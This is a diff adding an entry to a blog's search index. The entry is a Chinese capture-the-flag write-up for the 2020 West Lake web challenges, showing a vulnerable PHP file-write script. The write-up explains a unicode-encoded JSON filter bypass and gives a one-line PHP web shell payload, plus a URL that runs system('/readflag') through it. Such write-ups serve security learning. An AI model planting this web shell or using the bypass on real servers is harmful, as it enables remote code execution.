@@ -2143,6 +2143,42 @@
       </tags>
   </entry>
   <entry>
+    <title>西湖论剑web复现</title>
+    <url>/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/</url>
+    <content><![CDATA[<h3 id="web-esayjson"><a href="#web-esayjson" class="headerlink" title="web-esayjson"></a>web-esayjson</h3><blockquote>
+<p><a href="http://easyjson.xhlj.wetolink.com/">http://easyjson.xhlj.wetolink.com/</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;   <span class="comment">//source不能为空</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.sha1(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>; <span class="comment">//沙盒，设置沙盒根据自己ip获得目录</span></span><br><span class="line">var_dump(<span class="variable">$sandbox</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$sandbox</span>))&#123;    <span class="comment">//没有就创建沙盒</span></span><br><span class="line">    mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$sandbox</span>.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>); <span class="comment">//POST传入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="variable">$content</span> = json_decode(<span class="variable">$content</span>);  </span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$filecontent</span> = <span class="variable">$content</span>-&gt;content;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$sandbox</span>.<span class="variable">$filename</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>,<span class="variable">$filecontent</span>.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>); <span class="comment">//json格式内容写入</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$action</span> == <span class="string">&quot;reset&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink(<span class="variable">$sandbox</span>.<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p><a href="https://blog.csdn.net/weixin_30940783/article/details/95444711">file_get_contents(“php://input”)理解</a></p>
+<blockquote>
+<p>思路：先生成一个沙盒目录，写入json格式内容，读取flag</p>
+</blockquote>
+<p>SecurityCheck()函数会对json格式的内容进行验证，对<code>content</code>这个变量进行了过滤。并且filename这个参数可以后缀名是<code>.php</code>而且不能的数字</p>
+<p>json格式进行绕过：<a href="https://xz.aliyun.com/t/306">浅谈json参数解析对waf绕过的影响</a></p>
+<p>wp测试说<a href="https://tool.chinaz.com/tools/unicode.aspx">unicode编码</a>可以绕过</p>
+<p><img src="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/1.png" alt="1"></p>
+<p><img src="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/2.png" alt="1"></p>
+<p><a href="https://mp.weixin.qq.com/s/Jbdd3Oa8MnymI-ooJA-t0w">参考官方wp</a></p>
+<hr>
+<p>内容也可以写入<code>&#123;&quot;content&quot;:&quot;&lt;?php $_GET[0]($_GET[1]);? &gt;&quot;&#125;</code>的 编码</p>
+<p>然后<a href="http://easyjson.xhlj.wetolink.com/sandbox/8ff393509060e51038c905a23f595aa3c9454ef6/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/8ff393509060e51038c905a23f595aa3c9454ef6/?0=system&amp;1=/readflag</a> 获得flag</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247485137&idx=1&sn=a1d922b42556987ba5faa934cfb70218&chksm=e8a22500dfd5ac16c3fbba18d42f53ed6946fa98aaffc5d2829398e70b5fae2f85157889c32d&mpshare=1&scene=23&srcid=1012k3QtXa1fT24ENVA2p5fy&sharer_sharetime=1602491754980&sharer_shareid=8d22639189eb829cec87293a984e60e9#rd">参考文章</a>                                                <a href="https://blog.csdn.net/qq_46091464/article/details/108967312?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-11-108967312.nonecase&utm_term=%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91&spm=1000.2123.3001.4430">参考2</a></p>
+<hr>
+<h3 id="HardXSS"><a href="#HardXSS" class="headerlink" title="HardXSS"></a>HardXSS</h3><hr>
+<blockquote>
+<p><a href="https://xss.hardxss.xhlj.wetolink.com/">https://xss.hardxss.xhlj.wetolink.com/</a></p>
+</blockquote>
+<p><a href="https://mp.weixin.qq.com/s/QjwUMa7SNS5gDsDxC-e19Q">wp</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>2020西湖论剑web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>面经</title>
     <url>/2021/07/01/%E9%9D%A2%E7%BB%8F/</url>
     <content><![CDATA[<h2 id="赛宁网安"><a href="#赛宁网安" class="headerlink" title="赛宁网安"></a>赛宁网安</h2><p>信息安全实习生（南京实习）</p>
